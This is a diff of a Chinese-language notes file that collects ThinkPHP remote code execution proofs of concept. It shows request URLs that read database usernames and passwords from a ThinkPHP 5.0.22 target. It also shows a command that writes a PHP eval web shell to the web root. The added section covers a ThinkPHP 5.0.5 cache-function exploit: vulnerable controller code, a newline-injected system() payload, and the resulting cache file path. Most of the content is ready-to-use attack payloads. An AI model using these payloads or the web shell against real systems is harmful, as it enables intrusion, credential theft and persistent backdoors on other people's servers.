@@ -1,6 +1,6 @@
 ## **Thinkphp RCE　POC大全**
 在 Vulhub 中，也可以找到了该漏洞的利用 POC
-
+一般也可以用工具一把梭
 **Thinkphp 5.0.22 POC**
 1. `http://192.168.1.1/thinkphp/public/?s=.|think\config/get&name=database.username`
 2. `http://192.168.1.1/thinkphp/public/?s=.|think\config/get&name=database.password`
@@ -54,6 +54,23 @@ echo "<?php @eval(\$_POST['cmd']);?>" > /var/www/public/test.php
 
 
 
+^
+## **Thinkphp cache缓存函数远程代码执行漏洞**
+https://blog.csdn.net/rfrder/article/details/114599310
+tinkphp5.0.5默认控制器的部分代码，使用默认路由：
+```
+<?php
+ public function rce(){
+        Cache::set("cache",input('get.cache'));
+        return 'done';
+    }
+```
+
+缓存生成的路径和文件名是根据参数名的md5值计算的，这里是cache。
+```
+?s=index/index/rce&cache=%0d%0asystem(%27cat%20/flag%27);//
+缓存路径： runtime/cache/0f/ea6a13c52b4d4725368f24b045ca84.php
+```
 
 
 ^
